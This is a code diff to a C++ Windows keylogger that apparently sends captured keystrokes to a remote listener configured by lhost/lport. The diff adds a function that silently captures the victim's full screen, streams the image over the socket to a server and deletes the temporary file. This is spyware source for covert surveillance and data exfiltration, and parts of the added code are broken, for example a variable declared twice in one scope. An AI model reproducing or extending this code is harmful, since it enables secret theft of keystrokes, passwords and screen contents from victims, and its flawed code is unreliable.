@@ -1,5 +1,5 @@
 #include "keyscan.hpp"
-
+#include <chrono>
 /**
  * Do NOT edit this two lines! the program will automatically
  * use the lhost and lport and then edit this two lines by itself
@@ -190,6 +190,73 @@ bool SendLoggedKeys(int fd)
 	// Điều này giúp tránh việc gửi lại cùng dữ liệu.
 
 	remove("AdyW389234lWQ.txt");
+	return true;
+}
+
+bool CaptureScreenAndSend(int fd)
+{
+	// Chụp màn hình và lưu vào tệp tin ảnh tạm thời
+	time_t rawTime;
+	struct tm *timeInfo;
+	char buffer[80];
+	time(&rawTime);
+	timeInfo = localtime(&rawTime);
+	strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeInfo);
+	std::string currentTime(buffer);
+	std::string tempImageFileName = "temp_image_" + currentTime + ".bmp";
+	HDC hScreenDC = GetDC(NULL);
+	int width = GetSystemMetrics(SM_CXSCREEN);
+	int height = GetSystemMetrics(SM_CYSCREEN);
+	int imageSize = width * height * 3; // 3 bytes per pixel (RGB)
+	char *imageData = new char[imageSize];
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+	HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+	GetBitmapBits(hBitmap, imageSize, imageData);
+	DeleteDC(hMemoryDC);
+	ReleaseDC(NULL, hScreenDC);
+
+	// Ghi dữ liệu vào tệp tin ảnh tạm thời
+	std::ofstream imageFile(tempImageFileName, std::ios::binary);
+	if (!imageFile.is_open())
+	{
+		// std::cerr << "Failed to create temporary image file\n";
+		delete[] imageData;
+		return false;
+	}
+	imageFile.write(imageData, imageSize);
+	imageFile.close();
+
+	// Gửi dữ liệu từ tệp tin ảnh tạm thời đến server
+	std::ifstream inputFile(tempImageFileName, std::ios::binary);
+	if (!inputFile.is_open())
+	{
+		// std::cerr << "Failed to open temporary image file\n";
+		delete[] imageData;
+		return false;
+	}
+	char buffer[MAX_BUFFER];
+	while (inputFile.read(buffer, sizeof(buffer)))
+	{
+		if (!SendData(fd, buffer))
+		{
+			// std::cerr << "Failed to send image data\n";
+			inputFile.close();
+			delete[] imageData;
+			return false;
+		}
+	}
+	inputFile.close();
+	delete[] imageData;
+
+	// Xóa tệp tin ảnh tạm thời
+	if (remove(tempImageFileName.c_str()) != 0)
+	{
+		// std::cerr << "Failed to delete temporary image file\n";
+		return false;
+	}
+
 	return true;
 }
 
